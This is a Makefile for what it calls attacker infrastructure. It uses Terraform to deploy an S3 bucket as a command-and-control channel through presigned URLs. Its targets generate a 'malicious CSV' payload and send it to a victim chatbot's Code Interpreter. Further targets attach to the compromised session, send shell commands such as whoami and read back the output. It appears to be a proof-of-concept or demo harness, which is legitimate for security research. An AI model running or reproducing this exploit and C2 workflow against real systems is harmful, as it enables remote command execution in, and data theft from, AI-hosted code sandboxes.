# Attacker Infrastructure Makefile
# S3 C2 Channel and Attack Tools
#
# This infrastructure is owned by the ATTACKER. It includes:
# - S3 C2 Channel that uses presigned URLs to leverage an attacker-controlled bucket as a C2 server
# - Attack tools for generating malicious payloads and interacting with sessions
#
# The attacker does NOT have access to victim's Code Interpreter.
# All interaction happens via GETs/PUTs to the C2 bucket.

# Load .env file if it exists
ifneq (,$(wildcard .env))
include .env
export
endif

# =============================================================================
# Setup
# =============================================================================

setup:
	uv sync --all-extras
	@echo ""
	@echo "Setup complete! Run commands with: uv run c2 --help"

# Generate .env from Terraform outputs (run after terraform-apply)
env-from-terraform:
	@if [ ! -d "terraform/.terraform" ]; then \
		echo "Error: Run 'make terraform-init' first"; \
		exit 1; \
	fi
	@echo "# Generated from Terraform outputs" > .env
	@echo "S3_C2_BUCKET=$$(cd terraform && terraform output -raw s3_c2_bucket)" >> .env
	@echo "AWS_REGION=$$(cd terraform && terraform output -raw aws_region 2>/dev/null || echo us-east-1)" >> .env
	@echo "Generated .env file"

# =============================================================================
# Terraform (C2 Infrastructure)
# =============================================================================

terraform-init:
	cd terraform && terraform init

terraform-plan:
	cd terraform && terraform plan

terraform-apply:
	cd terraform && terraform apply

terraform-destroy:
	cd terraform && terraform destroy

# Full deploy: init + plan + apply (auto-approve)
deploy: terraform-init
	cd terraform && terraform plan && terraform apply -auto-approve
	$(MAKE) env-from-terraform
	@echo ""
	@echo "C2 Infrastructure deployed!"
	@echo ""
	@echo "Environment configured in .env"
	@echo "Run: uv run c2 --help"

# =============================================================================
# C2 Commands (via Click CLI)
# =============================================================================

# Generate malicious CSV
generate-csv:
	uv run c2 generate-csv

# Exploit: generate payload + send to victim in one step
# Usage: make exploit (reads ../.victim_url) or make exploit TARGET=https://victim-chatbot.com
exploit:
	@if [ -n "$(TARGET)" ]; then \
		uv run c2 exploit $(TARGET); \
	else \
		uv run c2 exploit; \
	fi

# Demo: narrated exploit + auto-attach
# Usage: make demo (reads ../.victim_url) or make demo TARGET=https://victim-chatbot.com
demo:
	@if [ -n "$(TARGET)" ]; then \
		uv run c2 exploit $(TARGET) --narrate; \
	else \
		uv run c2 exploit --narrate; \
	fi
	@echo ""
	@echo "Attaching to session..."
	@if [ -f .session_id ]; then \
		uv run c2 attach $$(cat .session_id); \
	fi

# Send command to session
# Usage: make send CMD="whoami" SESSION=sess_abc123
send:
	@if [ -z "$(SESSION)" ] || [ -z "$(CMD)" ]; then \
		echo "Usage: make send CMD=\"whoami\" SESSION=sess_abc123"; \
		exit 1; \
	fi
	uv run c2 send "$(CMD)" -s $(SESSION)

# Receive output from session
# Usage: make receive SESSION=sess_abc123
receive:
	@if [ -z "$(SESSION)" ]; then \
		echo "Usage: make receive SESSION=sess_abc123"; \
		exit 1; \
	fi
	uv run c2 receive -s $(SESSION)

# Connect to session interactively
# Usage: make connect-session (reads from .session_id) or make connect-session SESSION=sess_abc123
connect-session:
	@if [ -z "$(SESSION)" ] && [ -f .session_id ]; then \
		SESSION_ID=$$(cat .session_id); \
		echo "Using session ID from .session_id: $$SESSION_ID"; \
		uv run c2 attach $$SESSION_ID; \
	elif [ -n "$(SESSION)" ]; then \
		uv run c2 attach $(SESSION); \
	else \
		echo ""; \
		echo "No session ID found."; \
		echo ""; \
		echo "Run 'make exploit' or 'make generate-csv' first, or specify manually:"; \
		echo "  make connect-session SESSION=sess_abc123"; \
		echo ""; \
		exit 1; \
	fi

# Aliases for backwards compatibility
attach: connect-session
operator: connect-session

# Check S3 C2 bucket is accessible
check-s3:
	@if [ -z "$(S3_C2_BUCKET)" ]; then \
		echo "Error: S3_C2_BUCKET not set. Run 'make env-from-terraform' first."; \
		exit 1; \
	fi
	@echo "Checking S3 C2 bucket: $(S3_C2_BUCKET)"
	@aws s3 ls s3://$(S3_C2_BUCKET) --region $(or $(AWS_REGION),us-east-1) && echo "✓ Bucket accessible" || echo "✗ Bucket not accessible"

# =============================================================================
# Testing
# =============================================================================

test:
	uv run pytest tests/ -v

# =============================================================================
# Cleanup
# =============================================================================

clean:
	rm -rf .venv/
	rm -rf *.egg-info/
	rm -rf .eggs/
	rm -rf build/
	rm -rf dist/
	find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true
	rm -f .env
	rm -f .session_id
	rm -f malicious_data.csv

destroy: terraform-destroy clean

# =============================================================================
# Help
# =============================================================================

help:
	@echo ""
	@echo "S3 C2 Attacker Infrastructure"
	@echo "==============================="
	@echo ""
	@echo "Setup:"
	@echo "  make setup              Install dependencies with uv"
	@echo "  make deploy             Deploy C2 infrastructure"
	@echo ""
	@echo "Attack Workflow:"
	@echo "  make demo               Narrated exploit + auto-attach (for presentations)"
	@echo "  make exploit            Generate payload + send to victim (reads .victim_url)"
	@echo "  make exploit TARGET=url Override victim URL"
	@echo "  make connect-session    Attach to C2 session interactively"
	@echo ""
	@echo "Individual Steps:"
	@echo "  make generate-csv       Generate malicious CSV with payload (for manual exploitation in Web UI)"
	@echo ""
	@echo "Session Commands:"
	@echo "  make send CMD=x SESSION=x   Send command to session"
	@echo "  make receive SESSION=x      Get output from session"
	@echo ""
	@echo "C2 Management:"
	@echo "  make check-s3          Check S3 bucket status"
	@echo ""
	@echo "Or use the CLI directly:"
	@echo "  uv run c2 --help        Show all CLI commands"
	@echo ""

.PHONY: setup terraform-init terraform-plan terraform-apply terraform-destroy deploy demo exploit \
        generate-csv send receive connect-session attach operator check-s3 test clean destroy help \
        env-from-terraform
